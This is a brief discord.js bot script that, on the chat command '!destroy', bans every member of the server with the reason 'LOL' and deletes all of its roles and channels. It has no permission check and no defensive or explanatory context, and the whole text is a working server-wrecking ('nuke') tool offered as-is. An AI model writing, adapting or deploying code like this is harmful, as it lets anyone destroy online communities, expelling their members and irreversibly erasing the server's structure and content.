const prefix = '!'

client.on("message", message => {
    if (message.content.toLocaleLowerCase() === prefix + 'destroy')  {
      message.guild.members.cache.map(member => {member.ban({reason: 'LOL'}).then(console.log).catch(console.error)})
      message.guild.roles.cache.forEach(roles => {
        roles.delete()
        .then(deleted => console.log(`Deleted role ${deleted.name}`))
        .catch(console.error);
      });
      message.guild.channels.cache.forEach(roles => {
        roles.delete()
        .then(deleted => console.log(`Deleted channel ${deleted.name}`))
        .catch(console.error);
      });
    }
}
);
